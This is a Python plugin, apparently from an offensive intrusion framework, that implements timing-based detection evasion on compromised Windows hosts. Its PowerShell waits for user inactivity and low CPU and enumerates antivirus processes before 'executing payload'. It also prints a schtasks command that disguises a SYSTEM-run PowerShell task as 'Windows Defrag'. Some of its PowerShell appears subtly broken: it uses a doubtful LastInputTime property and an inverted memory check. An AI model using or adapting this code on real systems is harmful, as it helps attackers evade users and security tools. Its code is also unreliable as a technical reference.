"""defense_evasion/timing_evasion — Execute during safe windows to avoid detection. MITRE T1497"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class TimingEvasion(BasePlugin):
    NAME = "timing_evasion"
    DESCRIPTION = "Wait for safe execution window (user inactive, AV quiet, low network load)"
    AUTHOR = "fitnah-team"
    MITRE = "T1497"
    CATEGORY = "defense_evasion"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("check_interval", int, required=False, default=60,
              help="How often to check for safe window (seconds)"),
        Param("max_wait_time", int, required=False, default=3600,
              help="Maximum time to wait before executing anyway (seconds)"),
        Param("mode", str, required=False, default="safe",
              help="safe (wait) | immediate (no wait) | scheduled"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute timing evasion check"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        check_interval = params.get("check_interval", 60)
        max_wait_time = params.get("max_wait_time", 3600)
        mode = params.get("mode", "safe").lower()

        if mode == "safe":
            return self._wait_for_safe_window(ctx, check_interval, max_wait_time)
        elif mode == "immediate":
            return self._execute_immediate(ctx)
        elif mode == "scheduled":
            return self._schedule_safe_execution(ctx)
        else:
            return ModuleResult.err(f"Unknown mode: {mode}")

    @staticmethod
    def _wait_for_safe_window(ctx, check_interval: int, max_wait_time: int) -> ModuleResult:
        """Wait for safe execution window"""
        ps_code = f"""
$results = @()
$results += '[*] Waiting for safe execution window...'

try {{
    $checkInterval = {check_interval}
    $maxWaitTime = {max_wait_time}
    $safeWindow = $false
    $waitElapsed = 0

    $results += "[*] Check interval: $checkInterval seconds"
    $results += "[*] Max wait time: $maxWaitTime seconds"

    while (-not $safeWindow -and $waitElapsed -lt $maxWaitTime) {{
        # Check user activity
        $userActive = [System.Windows.Forms.SystemInformation]::LastInputTime
        $lastInputMs = [System.Environment]::TickCount - $userActive
        $lastInputMinutes = $lastInputMs / 1000 / 60

        $results += "[*] Last user input: $([Math]::Round($lastInputMinutes, 2)) minutes ago"

        # Check system load
        $cpuLoad = Get-WmiObject Win32_PerfFormattedData_PerfOS_Processor | Where-Object Name -eq '_Total' | Select-Object -ExpandProperty PercentProcessorTime
        $memLoad = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty GlobalMemoryStatus

        $results += "[*] CPU: $cpuLoad%, Memory: $(if ($memLoad) {{'unknown'}} else {{'OK'}})"

        # Check network load
        # (simplified - real implementation uses network performance counters)

        # Check AV/EDR activity
        # Process list for AV processes
        $avProcs = Get-Process -Name '*defender*', '*kasper*', '*mcafee*', '*norton*' -ErrorAction SilentlyContinue | Measure-Object

        $results += "[*] AV/EDR processes: $($avProcs.Count)"

        # Determine if safe
        if ($lastInputMinutes -gt 30 -and $cpuLoad -lt 20) {{
            $safeWindow = $true
            $results += '[+] SAFE: User inactive, low CPU load'
        }} else {{
            $results += '[-] Not safe yet:'
            if ($lastInputMinutes -le 30) {{ $results += '    - User has been active recently' }}
            if ($cpuLoad -ge 20) {{ $results += '    - CPU load too high' }}
            Start-Sleep -Seconds $checkInterval
            $waitElapsed += $checkInterval
        }}
    }}

    if ($safeWindow) {{
        $results += '[+] Safe window reached - executing payload'
    }} else {{
        $results += '[-] Max wait time exceeded - executing anyway'
    }}

}} catch {{
    $results += "[!] Timing evasion error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="timing_evasion_safe_window")

    @staticmethod
    def _execute_immediate(ctx) -> ModuleResult:
        """Execute without waiting"""
        ps_code = """
$results = @()
$results += '[*] Immediate execution mode (no timing evasion)'

try {
    $results += '[*] Executing payload immediately'
    $results += '[!] WARNING: No attempt to avoid detection'
    $results += '[*] High risk of triggering alerts'

} catch {
    $results += "[!] Error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="timing_immediate")

    @staticmethod
    def _schedule_safe_execution(ctx) -> ModuleResult:
        """Schedule execution for predicted safe time"""
        ps_code = """
$results = @()
$results += '[*] Scheduling safe execution...'

try {
    $results += '[*] Safe execution windows:'
    $results += '    - Weekday: 2:00 AM - 4:00 AM (maintenance window)'
    $results += '    - Weekend: 3:00 AM - 5:00 AM'
    $results += '    - Avoid: Business hours (8 AM - 6 PM)'
    $results += '    - Avoid: Patch Tuesday (2nd Tuesday of month)'

    $results += '[*] Implementation:'
    $results += '    1. Calculate next safe time'
    $results += '    2. Schedule via Task Scheduler'
    $results += '    3. Set to run as SYSTEM'
    $results += '    4. Set lowest priority'
    $results += '    5. Trigger: "At 3:00 AM every Saturday"'

    $results += '[*] Detection evasion:'
    $results += '    ✓ Executes during off-peak'
    $results += '    ✓ No immediate user disruption'
    $results += '    ✓ Appears as legitimate maintenance'
    $results += '    ✓ Low CPU/network impact'

    $results += '[*] Task Scheduler command:'
    $results += '    schtasks.exe /create /tn "Windows Defrag" /tr "powershell.exe -Command ..." /sc weekly /d SAT /st 03:00:00 /ru SYSTEM'

} catch {
    $results += "[!] Scheduling error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="timing_scheduled")
